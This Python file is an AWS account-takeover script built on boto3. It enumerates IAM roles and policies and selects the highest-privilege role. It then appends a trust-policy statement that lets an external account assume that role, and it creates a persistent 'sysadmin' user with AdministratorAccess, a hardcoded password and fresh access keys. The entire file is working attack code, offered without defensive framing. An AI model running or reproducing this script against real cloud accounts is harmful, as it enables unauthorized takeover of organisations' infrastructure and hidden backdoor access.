import boto3
import json
import time
import urllib.request

EXTERNAL_ACCOUNT_ID = "123456789012"
NEW_USER_NAME = "sysadmin"
NEW_USER_PASSWORD = "P@ssw0rd!2024!Takeover"

def get_account_id():
    sts = boto3.client('sts')
    return sts.get_caller_identity()['Account']

def enumerate_iam_users():
    iam = boto3.client('iam')
    users = []
    paginator = iam.get_paginator('list_users')
    for page in paginator.paginate():
        users.extend(page['Users'])
    return users

def enumerate_iam_roles():
    iam = boto3.client('iam')
    roles = []
    paginator = iam.get_paginator('list_roles')
    for page in paginator.paginate():
        roles.extend(page['Roles'])
    return roles

def enumerate_iam_policies():
    iam = boto3.client('iam')
    policies = []
    paginator = iam.get_paginator('list_policies')
    for page in paginator.paginate(Scope='Local', OnlyAttached=False):
        policies.extend(page['Policies'])
    return policies

def get_policy_document(policy_arn, version_id=None):
    iam = boto3.client('iam')
    if version_id:
        policy_version = iam.get_policy_version(
            PolicyArn=policy_arn,
            VersionId=version_id
        )
    else:
        policy = iam.get_policy(PolicyArn=policy_arn)
        policy_version = iam.get_policy_version(
            PolicyArn=policy_arn,
            VersionId=policy['Policy']['DefaultVersionId']
        )
    return policy_version['PolicyVersion']['Document']

def get_attached_role_policies(role_name):
    iam = boto3.client('iam')
    attached = []
    paginator = iam.get_paginator('list_attached_role_policies')
    for page in paginator.paginate(RoleName=role_name):
        attached.extend(page['AttachedPolicies'])
    return attached

def get_inline_role_policies(role_name):
    iam = boto3.client('iam')
    inline = []
    paginator = iam.get_paginator('list_role_policies')
    for page in paginator.paginate(RoleName=role_name):
        inline.extend(page['PolicyNames'])
    return inline

def get_inline_role_policy_document(role_name, policy_name):
    iam = boto3.client('iam')
    response = iam.get_role_policy(
        RoleName=role_name,
        PolicyName=policy_name
    )
    return response['PolicyDocument']

def check_admin_access(policy_document):
    policy_str = json.dumps(policy_document)
    if '"*"' in policy_str or '"*"' in policy_str:
        for statement in policy_document.get('Statement', []):
            if statement.get('Effect') == 'Allow':
                actions = statement.get('Action', [])
                resources = statement.get('Resource', [])
                if isinstance(actions, str):
                    actions = [actions]
                if isinstance(resources, str):
                    resources = [resources]
                if '*' in actions and '*' in resources:
                    return True
    return False

def find_highest_privilege_role(roles):
    admin_roles = []
    power_user_roles = []

    for role in roles:
        role_name = role['RoleName']
        try:
            attached = get_attached_role_policies(role_name)
            for policy in attached:
                try:
                    doc = get_policy_document(policy['PolicyArn'])
                    if check_admin_access(doc):
                        admin_roles.append(role)
                        break
                except:
                    pass

            inline_policies = get_inline_role_policies(role_name)
            for policy_name in inline_policies:
                try:
                    doc = get_inline_role_policy_document(role_name, policy_name)
                    if check_admin_access(doc):
                        if role not in admin_roles:
                            admin_roles.append(role)
                        break
                except:
                    pass
        except:
            pass

    if admin_roles:
        return admin_roles[0]

    for role in roles:
        role_name = role['RoleName']
        try:
            attached = get_attached_role_policies(role_name)
            for policy in attached:
                if policy['PolicyName'] == 'AdministratorAccess' or 'Admin' in policy['PolicyName']:
                    return role
        except:
            pass

    return roles[0] if roles else None

def get_current_trust_policy(role_name):
    iam = boto3.client('iam')
    response = iam.get_role(RoleName=role_name)
    return response['Role']['AssumeRolePolicyDocument']

def modify_trust_policy(role_name, external_account_id):
    iam = boto3.client('iam')

    current_policy = get_current_trust_policy(role_name)

    new_statement = {
        "Effect": "Allow",
        "Principal": {
            "AWS": f"arn:aws:iam::{external_account_id}:root"
        },
        "Action": "sts:AssumeRole",
        "Condition": {}
    }

    current_policy['Statement'].append(new_statement)

    iam.update_assume_role_policy(
        RoleName=role_name,
        PolicyDocument=json.dumps(current_policy)
    )

    return current_policy

def assume_role_from_external(role_arn, external_session):
    sts = external_session.client('sts')
    response = sts.assume_role(
        RoleArn=role_arn,
        RoleSessionName='TakeoverSession'
    )
    return response['Credentials']

def create_admin_user(session_credentials):
    iam = boto3.client(
        'iam',
        aws_access_key_id=session_credentials['AccessKeyId'],
        aws_secret_access_key=session_credentials['SecretAccessKey'],
        aws_session_token=session_credentials['SessionToken']
    )

    try:
        iam.create_user(UserName=NEW_USER_NAME)
    except iam.exceptions.EntityAlreadyExistsException:
        iam.delete_login_profile(UserName=NEW_USER_NAME)
        iam.delete_user(UserName=NEW_USER_NAME)
        time.sleep(5)
        iam.create_user(UserName=NEW_USER_NAME)

    iam.attach_user_policy(
        UserName=NEW_USER_NAME,
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )

    iam.create_login_profile(
        UserName=NEW_USER_NAME,
        Password=NEW_USER_PASSWORD,
        PasswordResetRequired=False
    )

    access_key = iam.create_access_key(UserName=NEW_USER_NAME)

    return {
        'UserName': NEW_USER_NAME,
        'Password': NEW_USER_PASSWORD,
        'AccessKeyId': access_key['AccessKey']['AccessKeyId'],
        'SecretAccessKey': access_key['AccessKey']['SecretAccessKey']
    }

